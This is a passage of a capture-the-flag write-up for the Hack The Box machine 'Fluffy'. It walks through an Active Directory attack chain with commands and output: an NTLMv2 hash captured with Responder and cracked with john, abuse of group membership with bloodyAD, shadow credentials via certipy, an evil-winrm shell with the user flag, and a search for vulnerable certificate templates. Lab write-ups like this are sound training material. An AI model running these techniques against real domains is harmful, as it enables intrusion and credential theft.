+</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    MQTT server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SNMP server                <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
+</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
+</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
+</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.16.54<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IPv6             <span class="o">[</span>dead:beef:4::1034<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="s1">&#39;, &#39;</span>ISATAP.LOCAL<span class="s1">&#39;]
+</span></span></span><span class="line"><span class="cl"><span class="s1">    Don&#39;</span>t Respond To MDNS TLD  <span class="o">[</span><span class="s1">&#39;_DOSVC&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">    TTL <span class="k">for</span> poisoned response  <span class="o">[</span>default<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
+</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-BRK0TWPXLCH<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>I23R.LOCAL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>45388<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.10.11.69
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : FLUFFY<span class="se">\p</span>.agila
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : p.agila::FLUFFY:fdc1aa73c3acdb83:B606E98CB19FCB3577179082F267FF74:01010000000000008008F79419EFDB01CA56BEFBA8D8649B0000000002000800490032003300520001001E00570049004E002D00420052004B00300054005700500058004C004300480004003400570049004E002D00420052004B00300054005700500058004C00430048002E0049003200330052002E004C004F00430041004C000300140049003200330052002E004C004F00430041004C000500140049003200330052002E004C004F00430041004C00070008008008F79419EFDB0106000400020000000800300030000000000000000100000000200000406C011FAC88DBC5C00DDEC41C1EAD63CDF9BED3D28B750241CDB10957DE97B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350034000000000000000000
+</span></span></code></pre></div><p>I got the username and it’s NTLM hash</p>
+<p>username = <code>p.agila</code></p>
+<p>NTLM hash =<code>p.agila::FLUFFY:fdc1aa73c3acdb83:B606E98CB19FCB3577179082F267FF74:01010000000000008008F79419EFDB01CA56BEFBA8D8649B0000000002000800490032003300520001001E00570049004E002D00420052004B00300054005700500058004C004300480004003400570049004E002D00420052004B00300054005700500058004C00430048002E0049003200330052002E004C004F00430041004C000300140049003200330052002E004C004F00430041004C000500140049003200330052002E004C004F00430041004C00070008008008F79419EFDB0106000400020000000800300030000000000000000100000000200000406C011FAC88DBC5C00DDEC41C1EAD63CDF9BED3D28B750241CDB10957DE97B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350034000000000000000000</code></p>
+<p>I cracked the hash using the tool john the ripper</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt --format<span class="o">=</span>netntlmv2 ntlmv2.hash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">prometheusx-303  <span class="o">(</span>p.agila<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:00:05 DONE <span class="o">(</span>2025-07-07 08:51<span class="o">)</span> 0.1872g/s 846046p/s 846046c/s 846046C/s promo04..programmercomputer
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed. 
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ john --show ntlmv2.hash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.agila:prometheusx-303:FLUFFY:fdc1aa73c3acdb83:B606E98CB19FCB3577179082F267FF74:01010000000000008008F79419EFDB01CA56BEFBA8D8649B0000000002000800490032003300520001001E00570049004E002D00420052004B00300054005700500058004C004300480004003400570049004E002D00420052004B00300054005700500058004C00430048002E0049003200330052002E004C004F00430041004C000300140049003200330052002E004C004F00430041004C000500140049003200330052002E004C004F00430041004C00070008008008F79419EFDB0106000400020000000800300030000000000000000100000000200000406C011FAC88DBC5C00DDEC41C1EAD63CDF9BED3D28B750241CDB10957DE97B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350034000000000000000000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">1</span> password <span class="nb">hash</span> cracked, <span class="m">0</span> left
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                             
+</span></span></code></pre></div><p>password = <code>prometheusx-303</code></p>
+<p>Looking for the relations in bloodhound</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo bloodhound
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Starting neo4j
+</span></span><span class="line"><span class="cl">Neo4j is running at pid <span class="m">2261</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Bloodhound will start
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> IMPORTANT: It will take time, please wait...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> opening http://127.0.0.1:8080
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;2025-07-08T04:14:25.732693874-04:00&#34;</span>,<span class="s2">&#34;level&#34;</span>:<span class="s2">&#34;INFO&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Reading configuration found at /etc/bhapi/bhapi.json&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;2025-07-08T04:14:25.734475864-04:00&#34;</span>,<span class="s2">&#34;level&#34;</span>:<span class="s2">&#34;INFO&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Logging configured&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;2025-07-08T04:14:25.797425147-04:00&#34;</span>,<span class="s2">&#34;level&#34;</span>:<span class="s2">&#34;INFO&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;No database driver has been set for migration, using: neo4j&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;2025-07-08T04:14:25.801730381-04:00&#34;</span>,<span class="s2">&#34;level&#34;</span>:<span class="s2">&#34;INFO&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Connecting to graph using Neo4j&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;2025-07-08T04:14:25.802504983-04:00&#34;</span>,<span class="s2">&#34;level&#34;</span>:<span class="s2">&#34;INFO&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Starting daemon Tools API&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;2025-07-08T04:14:25.809827923-04:00&#34;</span>,<span class="s2">&#34;level&#34;</span>:<span class="s2">&#34;ERROR&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;HTTP server listen error: listen tcp :2112: bind: address already in use&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;time&#34;</span>:<span class="s2">&#34;2025-07-08T04:14:25.857542167-04:00&#34;</span>,<span class="s2">&#34;level&#34;</span>:<span class="s2">&#34;INFO&#34;</span>,<span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;No new SQL migrations to run&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">                                                                                                               
+</span></span></code></pre></div><figure><img src="image%203.png"
+    alt="Fluffy" width="850">
+</figure>
+
+<p>I found this exploit to add a user in the <code>Service account</code></p>
+<h2 id="addmember">AddMember</h2>
+<p>This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, Self, AllExtendedRights or Self-Membership, over the target group.</p>
+<figure><img src="image%204.png"
+    alt="Fluffy" width="700">
+</figure>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD --host <span class="s2">&#34;</span><span class="nv">$DC_IP</span><span class="s2">&#34;</span> -d <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">&#34;</span> -u <span class="s2">&#34;</span><span class="nv">$USER</span><span class="s2">&#34;</span> -p <span class="s2">&#34;</span><span class="nv">$PASSWORD</span><span class="s2">&#34;</span> add groupMember <span class="s2">&#34;</span><span class="nv">$TargetGroup</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$TargetUser</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><p>the command i used</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ bloodyAD --host <span class="s2">&#34;10.10.11.69&#34;</span> -d <span class="s2">&#34;fluffy.htb&#34;</span> -u <span class="s2">&#34;p.agila&#34;</span> -p <span class="s2">&#34;prometheusx-303&#34;</span> add groupMember <span class="s2">&#34;SERVICE ACCOUNTS&#34;</span> <span class="s2">&#34;p.agila&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> p.agila added to SERVICE ACCOUNTS
+</span></span></code></pre></div><p><figure><img src="image%205.png"
+    alt="Fluffy" width="850">
+</figure>
+
+So the new user created ie <code>p.agila</code>  is a member of <code>service accounts</code></p>
+<p><figure><img src="image%206.png"
+    alt="Fluffy" width="850">
+</figure>
+
+The <code>outbound</code> of service account have <code>generic-write</code> to three users. So the new user <code>p.agila</code> also have <code>generic-write</code> access. I now need to abuse this access</p>
+<p>The GenericWrite permission in Active Directory <code>allows a user to modify all writable attributes of an object, except for properties that require special permissions such as resetting passwords.</code></p>
+<p>If an attacker gains GenericWrite over a user, they can write to the servicePrincipalNames attribute and immediately initiate a targeted Kerberoasting attack.
+Moreover, <code>having GenericWrite over a group enables them to add their account</code>—or one they control—directly to that group, effectively escalating privileges.</p>
+<p>Alternatively, if the attacker obtains GenericWrite over a computer object, <code>they can modify the msds-KeyCredentialLink attribute.</code> As a result, they create Shadow Credentials and authenticate as that computer account using Kerberos PKINIT.</p>
+<h2 id="add-user-in-any-outbound-object">Add user in any outbound Object</h2>
+<p>The outbound of service account has three services i.e. <code>CA_SVC,LDAP_SVC, WINRM_SVC</code>
+here i’ll chose to enumerate the third service i.e. <code>WINRM_SVC</code> because:</p>
+<ul>
+<li>Commonly used for <strong>remote shell</strong>, <strong>PowerShell remoting</strong>, and <strong>WMI</strong></li>
+<li>Often added to <strong><code>Remote Management Users</code></strong> or even has <strong>local admin rights</strong></li>
+<li>If it&rsquo;s bound to a <strong>SPN (ServicePrincipalName)</strong> for <code>WSMAN/</code> or <code>HTTP/</code> — you can abuse RBCD to impersonate <code>Administrator</code> to <strong>WinRM</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ServicePrincipalName    Name       MemberOf                                       PasswordLastSet             LastLogon                   Delegation 
+</span></span><span class="line"><span class="cl">----------------------  ---------  ---------------------------------------------  --------------------------  --------------------------  ----------
+</span></span><span class="line"><span class="cl">ADCS/ca.fluffy.htb      ca_svc     CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:07:50.136701  2025-07-08 11:58:02.445278             
+</span></span><span class="line"><span class="cl">LDAP/ldap.fluffy.htb    ldap_svc   CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-04-17 12:17:00.599545  &lt;never&gt;                                
+</span></span><span class="line"><span class="cl">WINRM/winrm.fluffy.htb  winrm_svc  CN=Service Accounts,CN=Users,DC=fluffy,DC=htb  2025-05-17 20:51:16.786913  2025-07-08 10:20:24.976539             
+</span></span></code></pre></div><p>With <code>GenericWrite</code> over a user, you can write to the <code>“msds-KeyCredentialLink”</code> attribute. Writing to this property allows an attacker to create <code>“Shadow Credentials”</code> on the object and authenticate as the principal using Kerberos PKINIT.</p>
+<p>Alternatively, you can write to the <code>“servicePrincipalNames”</code> attribute and perform a targeted <code>kerberoasting attack.</code></p>
+<p>got this hash = <code>33bd09dcd697600edf6b3a7af4875767</code></p>
+<p>Using the Following command</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ certipy-ad shadow auto -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -account &#39;WINRM_SVC&#39; -target &#39;10.10.11.69&#39;
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span></code></pre></div><p>Got the PowerShell access</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                                                                                                                                      
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ evil-winrm -i 10.10.11.69 -u &#34;WINRM_SVC&#34; -H &#34;33bd09dcd697600edf6b3a7af4875767&#34; 
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; 
+</span></span></code></pre></div><p>Got the user flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span><span class="o">&gt;</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="ne">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">5</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">56</span> <span class="n">AM</span>                <span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">5</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">2025</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">15</span> <span class="n">AM</span>                <span class="n">Documents</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="n">AM</span>                <span class="n">Downloads</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="n">AM</span>                <span class="n">Favorites</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="n">AM</span>                <span class="n">Links</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="n">AM</span>                <span class="n">Music</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="n">AM</span>                <span class="n">Pictures</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-----</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="n">AM</span>                <span class="n">Saved</span> <span class="n">Games</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="o">-</span><span class="n">r</span><span class="o">---</span>        <span class="mi">9</span><span class="o">/</span><span class="mi">15</span><span class="o">/</span><span class="mi">2018</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">19</span> <span class="n">AM</span>                <span class="n">Videos</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="ne">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">ar</span><span class="o">---</span>         <span class="mi">7</span><span class="o">/</span><span class="mi">8</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">05</span> <span class="n">AM</span>             <span class="mi">34</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">d924bdd5158f23b516307d702be92918</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">winrm_svc</span>\<span class="n">Desktop</span><span class="o">&gt;</span> 
+</span></span></code></pre></div><p>user flag = <code>d924bdd5158f23b516307d702be92918</code></p>
+<p>To get the Root Flag I executed WinPeas.exe but found nothing useful, then searched for vulnerable templates of the AD</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──(certipy-venv)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ certipy find -u &#39;p.agila&#39; -p &#34;prometheusx-303&#34; -dc-ip 10.10.11.69 -vulnerable -enabled
+</span></span><span class="line"><span class="cl">Certipy v5.0.3 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Finding certificate templates
+</span></span><span class="line"><span class="cl">[*] Found 33 certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding certificate authorities
+</span></span><span class="line"><span class="cl">[*] Found 1 certificate authority
+</span></span><span class="line"><span class="cl">[*] Found 11 enabled certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding issuance policies
+</span></span><span class="line"><span class="cl">[*] Found 14 issuance policies
+</span></span><span class="line"><span class="cl">[*] Found 0 OIDs linked to templates
+</span></span><span class="line"><span class="cl">[*] Retrieving CA configuration for &#39;fluffy-DC01-CA&#39; via RRP
+</span></span><span class="line"><span class="cl">[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl">[*] Successfully retrieved CA configuration for &#39;fluffy-DC01-CA&#39;
+</span></span><span class="line"><span class="cl">[*] Checking web enrollment for CA &#39;fluffy-DC01-CA&#39; @ &#39;DC01.fluffy.htb&#39;
+</span></span><span class="line"><span class="cl">[!] Error checking web enrollment: timed out
+</span></span><span class="line"><span class="cl">[!] Use -debug to print a stacktrace
+</span></span><span class="line"><span class="cl">[!] Error checking web enrollment: timed out
+</span></span><span class="line"><span class="cl">[!] Use -debug to print a stacktrace
+</span></span><span class="line"><span class="cl">[*] Saving text output to &#39;20250708085611_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote text output to &#39;20250708085611_Certipy.txt&#39;
+</span></span><span class="line"><span class="cl">[*] Saving JSON output to &#39;20250708085611_Certipy.json&#39;
+</span></span><span class="line"><span class="cl">[*] Wrote JSON output to &#39;20250708085611_Certipy.json&#39; 
+</span></span></code></pre></div><p>Tried on <code>CA_SVC</code> but didn’t got any hash</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(work)─(kali㉿kali)-[~]
+</span></span><span class="line"><span class="cl">└─$ certipy-ad shadow auto -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -account &#39;CA_SVC&#39; -target &#39;10.10.11.69&#39; -dc-ip 10.10.11.69
+</span></span><span class="line"><span class="cl">Certipy v5.0.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Targeting user &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Generating certificate
+</span></span><span class="line"><span class="cl">[*] Certificate generated
+</span></span><span class="line"><span class="cl">[*] Generating Key Credential
+</span></span><span class="line"><span class="cl">[*] Key Credential generated with DeviceID &#39;c1867b95-9641-ecee-4b5d-3d36f25250c4&#39;
+</span></span><span class="line"><span class="cl">[*] Adding Key Credential with device ID &#39;c1867b95-9641-ecee-4b5d-3d36f25250c4&#39; to the Key Credentials for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Successfully added Key Credential with device ID &#39;c1867b95-9641-ecee-4b5d-3d36f25250c4&#39; to the Key Credentials for &#39;ca_svc&#39;
+</span></span><span class="line"><span class="cl">[*] Authenticating as &#39;ca_svc&#39; with the certificate
+</span></span><span class="line"><span class="cl">[*] Certificate identities:
+</span></span><span class="line"><span class="cl">[*]     No identities found in this certificate
+</span></span><span class="line"><span class="cl">[*] Using principal: &#39;ca_svc@fluffy.htb&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
